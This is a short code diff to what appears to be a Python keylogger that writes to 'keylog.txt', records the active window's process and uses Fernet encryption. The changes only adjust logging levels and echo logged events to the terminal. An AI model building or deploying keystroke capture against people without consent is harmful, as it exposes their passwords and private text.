@@ -41,14 +41,14 @@ cipher_suite = Fernet(key)
 
 # Configure logging to a file and console
 logging.basicConfig(
-    level=logging.DEBUG,
-    format="%(asctime)s: %(message)s",
+    level=logging.INFO,  # Changed to INFO level for less verbose output
+    format='%(asctime)s: %(message)s',
     handlers=[
         logging.FileHandler("keylog.txt"),
         logging.StreamHandler()
     ]
 )
-
+logging.getLogger().handlers[1].setLevel(logging.INFO)  # Set terminal handler to INFO level
 # Global variables for logging state
 current_text = deque()
 log_buffer = deque()
@@ -80,7 +80,8 @@ def get_active_window_process_name() -> str:
 active_window_name = get_active_window_process_name()
 
 def log_event(message: str) -> None:
-    """Append a message to the log buffer and flush if necessary."""
+    """Log message to both file and terminal in real-time."""
+    logging.info(message)
     log_buffer.append(message)
     if len(log_buffer) >= 10:
         flush_log_buffer()
